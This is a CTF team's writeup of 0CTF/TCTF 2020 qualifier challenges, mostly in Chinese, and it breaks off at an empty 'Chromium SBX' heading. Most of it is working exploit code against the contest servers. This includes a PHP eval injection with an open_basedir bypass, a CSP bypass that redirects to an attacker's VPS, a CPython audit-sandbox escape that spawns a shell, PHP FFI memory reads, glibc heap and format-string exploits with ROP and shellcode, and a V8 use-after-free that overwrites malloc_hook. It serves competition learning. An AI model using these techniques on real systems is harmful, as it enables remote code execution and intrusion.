## 0CTF/TCTF 2020 Quals Writeup

## Misc/Cloud Computing

简单fuzz后，选择使用header来绕过并rce

```php
http://pwnable.org:47780/?action=upload&data=<?=end(getallheaders());?>

header最后一个字段加上:eval($_POST[a]);
```

加上`error_reporting(-1)`再`scandir()`得到报错发现有openbasedir和disable_function， 绕过一下：

```php
error_reporting(E_ALL);mkdir('/var/www/html/sandbox/xxxxxxxxxxxx/AAA');chdir('/var/www/html/sandbox/xxxxxxxxxxxx/AAA');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');
```

然后`readfile('/flag')`发现是乱码，`base64_encode(file_get_contents('/flag'))`先转base64再本地转一下，file命令查看发现是gzip压缩包，解压出来一个文件系统

```
Linux rev 1.0 ext2 filesystem data (mounted or unclean), UUID=d4d08581-e309-4c51-990b-6472ba249420 (large files)
```

使用r-studio恢复数据得到flag


## babyring

hash碰撞

随机生成 2^16 个msg，每个msg生成一个rc4的异或和，一共 2^16 个
随机生成 2^16 个x1，每个x1生成一个ys1，一共 2^16 个
随机生成 2^16 个x2，每个x1生成一个ys2，一共 2^16 个
随机生成 2^16 个x3，每个x1生成一个ys3，一共 2^^16 个
每个rc4异或和与每个ys1异或，得到2^32个值，打表
每个ys2与每个ys3异或，得到2^32个值，打表

找到两个表中相同的元素即可

## emmm

设res文件里的值为 (x_i, y_i)

假如能找到一组 (x1,y1),(x2,y2) 满足 x1*n=x2 (mod p)，且n比较小，就能够 O(n^2) 求解 k1

```python=
tmp0 = x * k0 % p
tmp1 = tmp0  * c % m
tmp2 = tmp1 * k1 % p
```

考虑 encrypt(n*x1)

tmp0 = (n*x1) * k0 % p = n * (x1 * k0 % p) - t1 * p   （0≤t1<n）
tmp1 = n * (x1 * k0 % p * c % m) + (-t1 * p * c) % m - t2 * m  （0≤t2≤n）
(模p意义下) y2 = tmp2 = n * y1 + ((-t1 * p * c) % m - t2 * m) * k1

枚举 t1,t2 就能解 k1

因为有 2^24 个x，所以有 2^48 组(x1,x2)，p有58位，n大概最小能到 2^12 左右

``` python=
K0 = 134854706973672807
K1 = 187692079449969593
invC = 1131579515458719391
def inv(x):
    return pow(x,P-2,P)
def decrypt(y,K0,K1):
    global P,C,M
    ans = []
    for t3 in range(5):
        x = (y * inv(K1) % P + P*t3) * invC % M * inv(K0) % P
        if encrypt_block(x)==y:
            ans.append(x)
    return ans
```






## lottery
ecb重放。16字节一个block，替换前4个block。注意的是，会更换user的前一个byte，因此我们需要找到和我们的目标user第一个byte相同的用户。多开，爆破之。
```python=
import requests
import base64
import re
url = "http://pwnable.org:2333/user/register"
url_login = "http://pwnable.org:2333/user/login"
url_buy="http://pwnable.org:2333/lottery/buy"
url_info="http://pwnable.org:2333/lottery/info"

def get_enc_from_username(un):
    session = requests.session()
    data={
    'username':un,
    'password':"aaaa"
    }
    register=requests.post(url=url,data=data)
    login=session.post(url=url_login,data=data)
    pattern=re.compile(r'"api_token":"(.*?)","coin')
    m=re.findall(pattern,login.text)

    buy_data={
    'api_token':m[0]
    }

    buy=session.post(url=url_buy,data=buy_data)
    pattern=re.compile(r'"enc":"(.*?)"')
    n=re.findall(pattern,buy.text)
    return n[0]

def info(enc):
    session = requests.session()
    info_data = {
        'enc': enc
    }
    info = session.post(url=url_info, data=info_data)
    pattern = re.compile(r'"lottery":"(.*?)","user":')
    l = re.findall(pattern, info.text)
    print info.text
    # print(info.text)
    # print("lottery: " + l[0] + "\n")
    pattern = re.compile(r',"user":"(.*?)","coin":')
    u = re.findall(pattern, info.text)
    return u[0]

def charge(enc):
    session = requests.session()
    info_data = {
        'enc': enc
    }

    info = session.post(url=url_info, data=info_data)
    pattern = re.compile(r'"lottery":"(.*?)","user":')
    l = re.findall(pattern, info.text)
    # print(info.text)
    print("lottery: " + l[0] + "\n")
    pattern = re.compile(r',"user":"(.*?)","coin":')
    u = re.findall(pattern, info.text)
    print("user: " + u[0])
    pattern = re.compile(r'"coin":(.*?)}')
    c = re.findall(pattern, info.text)
    print("coin: " + c[0])

    url_get_money_back = "http://pwnable.org:2333/lottery/charge"
    get_money_back = {
        'user': u[0],
        'coin': c[0],
        'enc': enc
    }
    get_back = session.post(url=url_get_money_back, data=get_money_back)
    print(get_back.text)

import os
#enc1=get_enc_from_username("fuckallo")
#print enc1
enc1="6\/cdkogK5Y+4ov\/k0oN0UVZE5L1O+24nfQyb3lXqduDOoB\/0trCCcL7bzXD73vyMXpUU4K\/Fls5GL03lgVvBYrk1ARz+kOioplCU7+SMuDJpjFuc1QqQz7hMzncIGijYjPkY23IMIpBaPqBZ5op6hvbSt9reYD8AcCI4hIXsxZg="
#pre1=info(enc1)[0:2]
#print pre1
pre1="11"
#raw_input()
while 1:
    name=os.urandom(4).encode("hex")
    enc2 = get_enc_from_username(name)
    pre2=info(enc2)[0:2]
    print pre1,pre2
    if pre2==pre1:
        print "find"
        fakeenc=base64.b64encode(enc2.decode("base64")[0:64]+enc1.decode("base64")[64:])
        charge(fakeenc)
```

## Wechat Generator

在svg转换为png图片的时候，可以向svg中插入image标签来读取任意文件，读取app.py得到secret路由
![](https://i.imgur.com/BuvddkK.png)

发现需要寻找到一个XSS，当将imagemagick转换的后缀名改为htm以后，得到一个html页面，可以插入html标签：

![](https://i.imgur.com/mbm8pZm.png)

发现被CSP拦截，但是发现CSP没有限制meta标签的跳转，同时题目只需要alert(1)即可获得flag，故使用meta标签跳转到自己的vps上触发alert(1)，获得flag，src等参数的过滤可以通过双写绕过

`<memetata name="language" content="0;http://vps/a.html" http-equiv="refresh"" />`

## Happy_tree
整个程序的执行逻辑存储在一个树状的结构中（多叉树），其中每个节点的结构体如下所示：
```cpp=
struct tree_node{
    DWORD multiple/opcode;
    DWORD width;
    DWORD func_handle;
    DWORD node_cnt;
    tree_node** a5;
}
```
由 func_handle 决定该节点的功能和向下遍历的方式，根节点为 `0x000271D0`
解决方法就是写个脚本把执行过程打印出来，然后看计算逻辑
最后解密脚本如下:
```python=
import os
import binascii
check = [
    0xa25dc66a,0x00aa0036,0xc64e001a,0x369d0854,0xf15bcf8f,
    0x6bbe1965,0x1966cd91,0xd4c5fbfd,0xb04a9b1b
]
dword = 0x67616c66
for i in range(100000):
    dword = dword ^ (dword << 0xd)
    dword &= 0xffffffff
    dword = dword ^ (dword >> 0x11)
    dword &= 0xffffffff
    dword = dword ^ (dword << 5)
    dword &= 0xffffffff
print hex(dword)
ans = ''
cnt = 0
for x in check:
    dword = x
    for j in range(100000):
        t = 0x1f
        for k in range(32/5+1):
            tmp = dword & t
            tmp = tmp << 5
            dword = tmp ^ dword
            t = t << 5
        dword = dword & 0xffffffff
        t = 0xffff8000
        for k in range(32/0x11+1):
            tmp = dword & t
            tmp = tmp >> 0x11
            dword = tmp ^ dword
            t = t >> 0x11
        dword = dword & 0xffffffff
        t = 0x1fff
        for k in range(32/0xd+1):
            tmp = dword & t
            tmp = tmp << 0xd
            dword = tmp ^ dword
            t = t << 0xd
        dword = dword & 0xffffffff
    if cnt % 2 == 0:
        ans += binascii.a2b_hex(hex(dword)[2:-1])[::-1]
    else:
        ans += binascii.a2b_hex(hex(dword^0xaaaaaaaa)[2:-1])[::-1]    
    cnt += 1
    print hex(dword)
print ans
```

## Simple Curve

We implemented this attack method https://www.math.uwaterloo.ca/~ajmeneze/publications/hyperelliptic.pdf

The calc() is giving us order part and then inverse mod.
```python=
U, V = ([113832590633816699072296178013238414056344242047498922038140127850188287361982, 107565990181246983920093578624450838959059911990845389169965709337104431186583, 1], [60811562094598445636243277376189331059312500825950206260715002194681628361141, 109257511993433204574833526052641479730322989843001720806658798963521316354418])
F = GF(2^256)
PP.<u> = PolynomialRing(F)
h = u^2 + u
f = u^5 + u^3 + 1
H = HyperellipticCurve(f, h)
J = H.jacobian()
X = J(F)

U = map(F.fetch_int, U)
V = map(F.fetch_int, V)
t = X([U[0] + U[1] * u + u^2, V[0] + V[1] * u])

def calc(n):
    F = GF(2^1)
    PP.<u> = PolynomialRing(F)
    h = u^2 + u
    f = u^5 + u^3 + 1
    H = HyperellipticCurve(f, h)
    J = H.jacobian()
    X = J(F)
    
    cs = H.count_points(2 * n)
    c1 = cs[n - 1]
    c2 = cs[-1]
    
    s1 = 2^n - c1
    s2 = (c2 - 2^(2 * n) + s1^2) / 2
    
    ksi = 1 - s1 + s2 - s1 * 2^n + 2^(2 * n)
    
    return ksi - c1 - 1

n = calc(256)

k = inverse_mod(65537, n)
t2 = t * k
print "flag{" + hex(t2[0].roots()[0][0].integer_representation())[2:-1].decode("hex") +"}"
```


## pyaucalc

builtins 可以通过 subclasses 搞出来，然后字节码搞出任意读写过 audit 就 ok 了。

执行是 eval ，执行不了语句，所以还需要用 exec 包一下：
```python=
DEBUG = False
DOCKER = False
if DEBUG:
    i = 139
    if DOCKER:
        i = 185
else:
    i = 183

sys = ''.__class__.__mro__[-1].__subclasses__()[i]()._module.sys;
modules = sys.modules
builtins = modules['builtins']
types = modules['types']
    
id = builtins.id
print = builtins.print
hex = builtins.hex
bytearray = builtins.bytearray
bytes = builtins.bytes
range = builtins.range
len = builtins.len
type = builtins.type
object = builtins.object
ord = builtins.ord


def p64(x):
    b = b''
    for i in [0, 1, 2, 3, 4, 5, 6, 7]:
        mask = (1 << ((i + 1) << 3)) - 1
        cur = (mask & x) >> (i << 3)
        b += bytes([cur])
    return b


def make_arb(addr, size=0x1000):
    a = (3, 2, 1)
    b = (4, 5, 6, 7)
    consts = (4, 5, 6)
    fake_bytearray = p64(1) + p64(id(bytearray)) + p64(size) + p64(size) + p64(addr) + p64(addr) + p64(addr)

    pointer = p64(id(fake_bytearray) + 0x20)

    consts_buf = id(consts) + 0x18
    pointer_buf = id(pointer) + 0x20

    offset = (pointer_buf - consts_buf) // 8

    def func():
        return 1

    code = b'\x90' + bytes([(offset & 0xff0000) >> 16])
    code += b'\x90' + bytes([(offset & 0xff00) >> 8])
    code += b'd' + bytes([offset & 0xff])
    code += b'S\x00'
    func.__code__ = func.__code__.replace(co_code=code, co_consts=consts)

    print(hex(offset))

    return func()

def arb_call(addr, arg1=''):
    a = type('fuck', (object,), {})
    type_rw = make_arb(id(a))
    target = p64(addr)

    for i in [0,1,2,3,4,5,6,7]:
        type_rw[0x80 + i] = target[i]

    x = a()
    obj_rw = make_arb(id(x))
    adjust = -1
    for i in range(len(arg1)):
        c = arg1[i]
        obj_rw[i] = ord(c) + adjust
        if adjust != 0:
            adjust = 0

    print('fuck yeah!')
    x()
    
if DEBUG and not DOCKER:
    base = id(type) - 0x364160
    system_call = base + 0xa3c9d
else:
    base = id(type) - 0x358940
    system_call = base + 0xf1553

arb_call(system_call, 'sh')
```

执行脚本：

```python=
from pwn import *
context(log_level='debug')

DEBUG = False
DOCKER = False

def read_sandbox_bin():
    io.recvuntil(b">>>")
    io.sendline(b"sandbox")
    data = io.recvuntil(b"\n").strip()
    return data

def send_code():
    io.recvuntil(b">>>")
    if DEBUG:
        if DOCKER:
            io.sendline(b'\'\'.__class__.__mro__[-1].__subclasses__()[185]()._module.sys.modules[\'builtins\'].exec(\'\'.__class__.__mro__[-1].__subclasses__()[185]()._module.sys.modules[\'builtins\'].input())')
        else:
            io.sendline(b'\'\'.__class__.__mro__[-1].__subclasses__()[139]()._module.sys.modules[\'builtins\'].exec(\'\'.__class__.__mro__[-1].__subclasses__()[139]()._module.sys.modules[\'builtins\'].input())')
    else:
        io.sendline(b'\'\'.__class__.__mro__[-1].__subclasses__()[183]()._module.sys.modules[\'builtins\'].exec(\'\'.__class__.__mro__[-1].__subclasses__()[183]()._module.sys.modules[\'builtins\'].input())')

    '''
    if DEBUG:
        if DOCKER:
            io.sendline(b'sys = \'\'.__class__.__mro__[-1].__subclasses__()[185]()._module.sys; modules=sys.modules; builtins=sys.modules[\'builtins\']; builtins.exec(\'\'.join(sys.stdin.readlines()))')
        else:
            io.sendline(b'sys = \'\'.__class__.__mro__[-1].__subclasses__()[139]()._module.sys; modules=sys.modules; builtins=sys.modules[\'builtins\']; builtins.exec(\'\'.join(sys.stdin.readlines()))')
    else:
        io.sendline(b'sys = \'\'.__class__.__mro__[-1].__subclasses__()[183]()._module.sys; modules=sys.modules; builtins=sys.modules[\'builtins\']; builtins.exec(\'\'.join(sys.stdin.readlines()))')
    '''

    payload = 'builtins=\'\'.__class__.__mro__[-1].__subclasses__()[{}]()._module.sys.modules[\'builtins\']; builtins.exec({})'

    with open('arb.py', 'r') as f:
        content = f.read()

    if DEBUG:
        if DOCKER:
            i = 185
        else:
            i = 139
    else:
        i = 183

    io.info(repr(content))
    payload = payload.format(i, repr(content))

    io.sendline(payload)
    io.recvuntil('fuck yeah!')

    io.sendline('/readflag')

    io.interactive()

            
if DEBUG:
    io = process(['python', 'run.py'])
else:
    io = remote("pwnable.org", 41337)

#data =read_sandbox_bin()

#a = eval(data)
#with open("sandbox","wb") as f:
#    f.write(a)
send_code()

```

## noeasyphp

利用 `FFI::cast` 类型混淆搞个任意读，然后读 ffi 结构体里的 symbols。

```python=
import requests
import urllib.parse

def main():
    src = '''
error_reporting(E_ALL);

register_shutdown_function("fatal_handler");
function fatal_handler(){
    $errfile = "unknown file";
    $errstr  = "shutdown";
    $errno   = E_CORE_ERROR;
    $errline = 0;
    $error = error_get_last();
    if($error !== NULL) {
        $errno   = $error["type"];
        $errfile = $error["file"];
        $errline = $error["line"];
        $errstr  = $error["message"];
        var_dump($errno, $errstr, $errfile, $errline);
    }
}

// read ffi_addr + 0x40: symbols
function read_addr8($addr) {
    $b = FFI::new('long[2]'); // 0x60
    $b[0] = $addr;
    $tmp = FFI::cast("long*[2]", $b);
    return $tmp[0][0];
}

function read_addr_size($addr, $size) {
 $s = "";
 $tmp = FFI::new('long[2]');
 for ($i = 0; $i <= $size; $i++) {
  $tmp = FFI::cast('long[2]', $tmp);
  $tmp[0] = $addr + $i;
  $tmp = FFI::cast("char*[2]", $tmp);
  $s .= $tmp[0][0];
 }
 return $s;
}

function var_dump_ret($mixed = null) {
  ob_start();
  var_dump($mixed);
  $content = ob_get_contents();
  ob_end_clean();
  return $content;
}

$temp1 = FFI::new('long[12]');
$temp2 = FFI::new('long[12]');
$ffi = FFI::load("/flag.h");
$temp3 = FFI::new('long[12]');
$temp4 = FFI::new('long[12]');
$temp5 = FFI::new('long[12]');
$temp6 = FFI::new('long[12]');
$temp7 = FFI::new('long[12]');
$temp8 = FFI::new('long[12]');
$temp9 = FFI::new('long[12]');

function read_cdata_addr($cdata) {
    $h = FFI::cast('long*', $cdata);
    $h = FFI::cast('long', $h);

    $heap_addr_new = var_dump_ret($h);
    $heap_addr_new = explode('int(', $heap_addr_new);
    $heap_addr_new = explode(')', $heap_addr_new[1])[0];
    $heap_addr = (int)$heap_addr_new;
    return $heap_addr;
}

echo '===temp1 addr===\n';
var_dump(dechex(read_cdata_addr($temp1)));
echo '===temp2 addr===\n';
var_dump(dechex(read_cdata_addr($temp2)));
echo '===temp3 addr===\n';
var_dump(dechex(read_cdata_addr($temp3)));
echo '===temp4 addr===\n';
var_dump(dechex(read_cdata_addr($temp4)));

echo "===START===\n";
$b = FFI::new('long[12]'); // 0x60
$b[0] = 0xdeadbeef;
$b[1] = 0xbeefdead;
$heap = FFI::cast("long*", $b);
$heap = FFI::cast("long", $heap);

echo "===Getting Heap Addr===\n";
$heap_addr_new = var_dump_ret($heap);
$heap_addr_new = explode('int(', $heap_addr_new);
$heap_addr_new = explode(')', $heap_addr_new[1])[0];
$heap_addr = (int)$heap_addr_new;
echo "===Done Getting Heap Addr===\n";

//$ffi_addr = $heap_addr - 0x60;
$ffi_addr = read_cdata_addr($temp3) + 0x60;

echo "===READ_ADDR_STARTS===\n";
echo "--> Stage 1\n";
var_dump(dechex($ffi_addr)); // 0x660
$symbols_addr = read_addr8($ffi_addr+0x40);
var_dump(dechex($symbols_addr));
echo "--> Stage 2\n";
$symbols_bucket = read_addr8($symbols_addr+0x10);
var_dump(dechex($symbols_bucket));
echo "--> Stage 3\n";
$symbols_string = read_addr8($symbols_bucket+0x18);
var_dump(dechex($symbols_string));
echo "--> Stage 4\n";
$string_len = read_addr8($symbols_string+0x10);
var_dump($string_len);
echo "--> Stage 5\n";
$string_len = read_addr8($symbols_string+0x10);
var_dump(dechex($string_len));
var_dump(read_addr_size($symbols_string+0x18, $string_len));
//var_dump(dechex(read_addr8($symbols_string+0x18)));
echo '--- done ---\n';

$flag = $ffi->flag_wAt3_uP_apA3H1();

for ($i = 0; $i < 30; $i++) {
  echo $flag[$i];
}
'''
    #res = requests.get('''http://pwnable.org:19261/?rh=$ffi = FFI::load("/flag.h");$b = FFI::new('long[12]');$heap = FFI::cast("long*", $b); $heap = FFI::cast("long", $heap); $arr = FFI::new('long[1]'); $arr[0] = $heap; $heap_addr = $arr[0]; $ffi_addr = $heap_addr - 0x60; function read_addr8()''')
    res = requests.get('http://pwnable.org:19261/?rh={}'.format(urllib.parse.quote(src)))
    print(res)
    print(res.text)


if __name__ == "__main__":
    main()
```

## easyphp

列目录，看到/flag,so
`$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');};`

题目的openbasedir一直在变，多请求几次就行了
![](https://i.imgur.com/ze3akVH.png)

`http://pwnable.org:19260/?rh=mkdir('/tmp/w1nd'); chdir('/tmp/w1nd'); ini_set('open_basedir','..'); chdir('..'); chdir('..'); chdir('..'); chdir('..'); chdir('..'); ini_set('open_basedir','/'); echo "open_basedir:".ini_get('open_basedir')."\n"; print_r(scandir('..')); echo file_get_contents("php://filter/convert.base64-encode/resource=/flag.so"); `
![](https://i.imgur.com/0A6Woax.png)

## Duet
```python=3
from pwn import *

debug = 0

if debug:
    # p = process(['docker', 'run', '-i', '0c23e3923320'])
    p = process(['chroot', './duet', '/duet'], aslr=False)
else:
    p = remote('pwnable.org', 12356)

ins_map = ['琴', '瑟']


def alloc(t: int, l, c):
    p.sendlineafter(':', '1')
    p.sendlineafter(':', ins_map[t])
    p.sendlineafter(':', str(l))
    if len(c) < l:
        if isinstance(c, bytes):
            c = c.ljust(l, b'\x00')
        elif isinstance(c, str):
            c = c.ljust(l, '\x00')
    p.sendafter(':', c)


def free(t: int):
    p.sendlineafter(':', '2')
    p.sendlineafter(':', ins_map[t])


def show(t: int):
    p.sendlineafter(':', '3')
    p.sendlineafter(':', ins_map[t])


def magic(num):
    p.sendlineafter(':', '5')
    p.sendlineafter(':', str(num))


def un_tc(size):
    for x in range(7):
        alloc(0, size, 'f')
        free(0)


un_tc(0x98)
un_tc(0xe8)
for x in range(5):
    alloc(0, 0xd8, 'f')
    free(0)
alloc(1, 0x98, 'v' * 0x98)
un_tc(0x188)
free(1)

un_tc(0x1e8)

# alloc(0, 0x98, 'v')
# free(0)
alloc(0, 0x188, 'a')
payload = b'b' * 0xe0 + p64(0x1f0) + p64(0x10) + b'b' * 8
alloc(1, 0xf8, payload)
free(0)
alloc(0, 0x98, 'v' * 0x98)
magic(0xf1)
free(0)
payload = b'c' * 0xf8 + p64(0xa1) + b'd' * 0x98 + p64(0x61)
alloc(0, 0x1e8, payload)
free(1)
show(0)
p.recvuntil('c' * 0xf8)
p.recv(8)
heap = u64(p.recv(8))
libc = u64(p.recv(8)) - 0x1e4ca0
log.success(f'libc :{libc:x} heap: {heap:x}')

free(0)
alloc(0, 0x98, 'nonick')
alloc(1, 0x98, 'nonick')
free(0)

alloc(0, 0x200, p64(0x11) * 20)
free(0)

payload = b'c' * 0xf8 + p64(0x191) + b'e' * 0xe8
alloc(0, 0x1e8, payload)

free(1)
alloc(1, 0xa8, 'nonick')
free(0)
fake = p64(0) + p64(0xe1) + p64(heap + 0x1b60) + p64(heap + 0x1dd0 + 0xe0)
fake = fake.ljust(0xe0)
fake += p64(0) + p64(0xe1) + p64(heap + 0x1dd0) + p64(libc + 0x1E7600 - 0x10)
fake += p64(0x11)
context.arch = 'amd64'
alloc(0, 0x300, fake)
free(0)
page = heap + 0x20f0
page >>= 12
page <<= 12
sigret = libc + 0x14BC61
fake = p64(sigret) * 3
fake += p64(heap + 0x20f0 + 0x20)
fake += p64(0)
fake += p64(libc + 0x00000000000538e3) + p64(0)
fake += b'\x00' * 0x30
fake += p64(libc + 0xed5dc)
fake += b'\x00' * (0xd0 - 0x40)
fake += p64(heap + 0x20f0 + 0x20)

fake += p64(libc + 0x0000000000026542)
fake += p64(page)
fake += p64(libc + 0x0000000000026f9e)
fake += p64(0x1000)
fake += p64(libc + 0x000000000012bda6)
fake += p64(7)
fake += p64(libc + 0x117590)
fake += p64(heap + 0x20f0 + len(fake) - 8)

fake += asm(
    f'''{shellcraft.amd64.linux.echo('aaaa')}
            {shellcraft.amd64.pushstr('flag')}
            lea rdi,[rsp]
            xor rsi,rsi
            mov rax,2
            syscall
             {shellcraft.amd64.linux.read(3, 'rdi', 0x100)}
            {shellcraft.amd64.linux.write(1, 'rsp', 0x100)}'''
)
alloc(0, 0x300, fake)
free(0)

for x in range(10):
    sz = 0x3f0 - x * 0x10
    data = p64(0x11) * (sz >> 3)
    for y in range(7):
        alloc(0, sz, data)
        free(0)

payload = b'c' * 0xf8 + p64(0xb1) + b'e' * 0xa8 + p64(0xe1) + p64(libc + 0x1e4d70) + p64(heap + 0x1dd0)
alloc(0, 0x1e8, payload)
free(1)

io_list = libc + 0x1E5660
log.success(f'io list all {io_list:x}')
vt = libc + 0x1E5B40 - 0x18

alloc(1, 0xd8,
      b'\x00' * 0x28 + p64(0x11) + p64(0) + p64(0x211) + p64(0x11) * 8 + p64(0x11223344) + p64(
          heap + 0x20f0 - 8) + p64(heap + 0x1bd0 - 0x70) + p64(1) * 6 + p64(vt))

free(0)
fake = p64(0xfbad8000) + p64(0x1441) + p64(0x1) + p64(0x1) + p64(0x5) + p64(0x6)

payload = b'c' * 0xf8 + p64(0xb1) + b'e' * 0xa0 + fake
alloc(0, 0x1e8, payload)
free(1)
# if debug:
#     gdb.attach(p, f'hbreak *0x1555553bfff8  ')

p.sendlineafter(':', '6')
p.interactive()
```

# simple echoserver
```python=3
from pwn import *

debug = 0


def exp(p):
    payload = '%c' * 5 + '%70c%c' + '%c' * 10 + '%245c' + '%hhn' + '%c' * 10 + '%*c' + '%c' * 6 + '%507442c' + '%n'
    payload = payload.ljust(256, 'a')
    p.sendafter('name:', payload)
    # p.sendafter('phone:', '6' * 10)
    p.sendlineafter('!', '~.')


while True:
    try:
        if debug:
            p = process('./simple_echoserver', env={'LD_PRELOAD': './libc-2.27.so'}, stderr=open('/dev/null', 'w'))
        else:
            p = remote('pwnable.org', 12020)

        # if debug:
        #     gdb.attach(p, f'vmmap')
        # payload = '%75c%7$hhn%43$hhn'
        exp(p)
        p.recv()
        p.sendline('ls')
        p.sendline('ls')
        data = p.recv()
        if data:
            print(data)
            p.interactive()
            p.close()
            break
    except:
        continue
```

## eeemoji
```python=2
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
io = remote("pwnable.org",  31322)

rl = lambda a=False     : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
rn = lambda x           : io.recvn(x)
sn = lambda x           : io.send(x)
sl = lambda x           : io.sendline(x)
sa = lambda a,b         : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
irt = lambda            : io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s,addr      : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
uu32 = lambda data      : u32(data.ljust(4, '\x00'))
uu64 = lambda data      : u64(data.ljust(8, '\x00'))

def Menu(cmd):
    welcome = u'\U0001F37A\U0000000A'.encode("utf-8")
    sla(welcome, cmd)

def Add():
    cmd = u'\U0001F37A'.encode("utf-8")
    Menu(cmd)

def Show():
    cmd = u'\U0001F42E'.encode("utf-8")
    Menu(cmd)

def Edit(content):
    cmd = u'\U0001F434'.encode("utf-8")
    Menu(cmd)
    sl(content)
def unicode_to_utf8(aint):
    fmt1 = '0xxxxxxx'
    fmt2 = '110xxxxx10xxxxxx'
    fmt3 = '1110xxxx10xxxxxx10xxxxxx'
    fmt4 = '11110xxx10xxxxxx10xxxxxx10xxxxxx'
    fmt5 = '111110xx10xxxxxx10xxxxxx10xxxxxx10xxxxxx'
    fmt6 = '1111110x10xxxxxx10xxxxxx10xxxxxx10xxxxxx10xxxxxx'

    abin = bin(aint)[2:]
    total = len(abin)

    if total < 8:
        fmt = fmt1
    elif total < 12:
        fmt = fmt2
    elif total < 17:
        fmt = fmt3
    elif total < 22:
        fmt = fmt4
    elif total < 27:
        fmt = fmt5
    elif total <= 32:
        fmt = fmt6  

    fmt = fmt[::-1]
    abin = abin[::-1]
    final = ''
    i = 0
    for val in fmt:
        if i != total:
            if val == 'x':
                final += abin[i]
                i += 1
            else :
                final += val
        else :
            if val == 'x':
                final += '0'
            else :
                final += val
    final = int(final[::-1], 2)
    if final == 0:
        return '\x00'
    else :
        return p64(final)[::-1].strip('\x00')
        
Add()

payload = unicode_to_utf8(0x11223344)

payload += unicode_to_utf8(0x09e83bb0)
payload += unicode_to_utf8(0x2f000000)
payload += unicode_to_utf8(0x2f6e6962)
payload += unicode_to_utf8(0x00006873)
payload += unicode_to_utf8(0x5e006a5f)
payload += unicode_to_utf8(0x0f5a006a)
payload += unicode_to_utf8(0x00000005)

payload += 200*u'\U00005341'.encode("utf-8")
Edit(payload)

irt()
```

## eeeeeemoji
```python=2
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
io = remote("pwnable.org", 31323)

rl = lambda a=False     : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
rn = lambda x           : io.recvn(x)
sn = lambda x           : io.send(x)
sl = lambda x           : io.sendline(x)
sa = lambda a,b         : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
irt = lambda            : io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s,addr      : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
uu32 = lambda data      : u32(data.ljust(4, '\x00'))
uu64 = lambda data      : u64(data.ljust(8, '\x00'))

def Menu(cmd):
    welcome = u'\U0001F37A\U0000000A'.encode("utf-8")
    sla(welcome, cmd)

def Add():
    cmd = u'\U0001F37A'.encode("utf-8")
    Menu(cmd)
    ru('mmap() at @')
    return int(rl(), 16)

def Show():
    cmd = u'\U0001F42E'.encode("utf-8")
    Menu(cmd)

def Edit(content):
    cmd = u'\U0001F434'.encode("utf-8")
    Menu(cmd)
    sl(content)
    
def unicode_to_utf8(aint):
    fmt1 = '0xxxxxxx'
    fmt2 = '110xxxxx10xxxxxx'
    fmt3 = '1110xxxx10xxxxxx10xxxxxx'
    fmt4 = '11110xxx10xxxxxx10xxxxxx10xxxxxx'
    fmt5 = '111110xx10xxxxxx10xxxxxx10xxxxxx10xxxxxx'
    fmt6 = '1111110x10xxxxxx10xxxxxx10xxxxxx10xxxxxx10xxxxxx'

    abin = bin(aint)[2:]
    total = len(abin)

    if total < 8:
        fmt = fmt1
    elif total < 12:
        fmt = fmt2
    elif total < 17:
        fmt = fmt3
    elif total < 22:
        fmt = fmt4
    elif total < 27:
        fmt = fmt5
    elif total <= 32:
        fmt = fmt6  

    fmt = fmt[::-1]
    abin = abin[::-1]
    final = ''
    i = 0
    for val in fmt:
        if i != total:
            if val == 'x':
                final += abin[i]
                i += 1
            else :
                final += val
        else :
            if val == 'x':
                final += '0'
            else :
                final += val
    final = int(final[::-1], 2)
    if final == 0:
        return '\x00'
    else :
        return p64(final)[::-1].strip('\x00')
        
addrlist = []
for x in xrange(25):
    addr = Add()
    if 0x8000 == addr:
        addrlist.append(addr)
        break
    else:
        addrlist.append(addr)

for x in addrlist:
    log.info(hex(x))

payload = 16*unicode_to_utf8(0)
payload += unicode_to_utf8(0x8500)
payload += unicode_to_utf8(0x0)
payload += 12*unicode_to_utf8(0)

payload += unicode_to_utf8(0x206)
payload += unicode_to_utf8(0)
payload += unicode_to_utf8(0x8088)
payload += unicode_to_utf8(0x0)
payload += unicode_to_utf8(0x8090)
payload += unicode_to_utf8(0x0)


payload += unicode_to_utf8(0x003bb866)
payload += unicode_to_utf8(0x000009e8)
payload += unicode_to_utf8(0x69622f00)
payload += unicode_to_utf8(0x68732f6e)
payload += unicode_to_utf8(0x6a5f0000)
payload += unicode_to_utf8(0x006a5e00)
payload += unicode_to_utf8(0x050f5a)

payload += 200*u'\U0000e431'.encode("utf-8")
Edit(payload)

irt()
```

## chromium rce

```javascript=
const hex = (x) => ("0x" + x.toString(16));
const print = console.log
const arr1 = new Uint32Array(new ArrayBuffer(0x800));
const arr2 = new Uint32Array(new ArrayBuffer(0x800));
%ArrayBufferDetach(arr1.buffer);
arr2.set(arr1); // leak;
const libcAddr = arr2[2] + arr2[3] * 0x100000000 - 0x3ebca0
print(hex(libcAddr));


const abs = [];
for (let i = 0; i < 8; i++) {
    abs.push(new ArrayBuffer(0x60));
}

const arr3 = new Uint32Array(new ArrayBuffer(0x60));
const arr4 = new Uint32Array(new ArrayBuffer(0x60));
const mallocHook = libcAddr + 0x3ebc30 - 0x23;
arr4[0] = mallocHook % 0x100000000;
arr4[1] = (mallocHook - arr4[0]) / 0x100000000;
for (let i = 0; i < 8; i++) {
    %ArrayBufferDetach(abs[i]);
}
%ArrayBufferDetach(arr3.buffer);

arr3.set(arr4);
new ArrayBuffer(0x60);
const hookWriter = new Uint8Array(new ArrayBuffer(0x60));
let oneGadget = libcAddr + 0x10a38c;
for (let i = 0; i < 8; i++) {
    const t = oneGadget % 0x100;
    hookWriter[0x13 + i] = t;
    oneGadget = (oneGadget - t) / 0x100;
}
// hookWriter.fill(0x41, 0x13, 0x13 + 8);
new ArrayBuffer(0);
```

## Chromium SBX

```htmlmixed=
